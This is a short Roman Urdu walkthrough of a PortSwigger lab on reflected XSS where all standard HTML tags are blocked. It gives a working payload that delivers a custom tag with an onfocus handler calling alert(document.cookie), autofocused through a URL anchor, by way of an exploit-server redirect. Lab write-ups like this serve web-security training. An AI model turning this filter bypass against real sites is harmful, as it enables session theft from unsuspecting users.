# 💻 Yeh kis tarah ki technique thi?

## 🔍 Lab ka Naam:
**Reflected XSS into HTML context with all tags blocked except custom ones**

---

## 🧠 Lab ka Maqsad:
Yeh lab hum se chahta hai ke hum XSS inject karein ek aise page mein jahan:
- **Sab normal HTML tags block** ho jaate hain (jaise <script>, ```<img>```, ```<svg>```)
- Lekin **custom tags** jaise `<xss>`, `<khan>` allowed hain
- Humein aisa payload banana hai jo **alert(document.cookie)** ko fire kare — taake victim ki cookies browser se nikaali ja sakein

---

## 🧪 Working Payload (Exploit server mein daalna hai):

```html```

```<script>```

```location =``` ```'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x';```

</script>```

---

🔁 Bas apne lab ki URL daal dena YOUR-LAB-ID ki jagah
Yehi payload use hoga victim ko XSS dene ke liye ✅

### 🔍 Payload Ki Tashreeh

```<khan id="x" onfocus="alert(document.cookie)" tabindex="1">The King</khan>```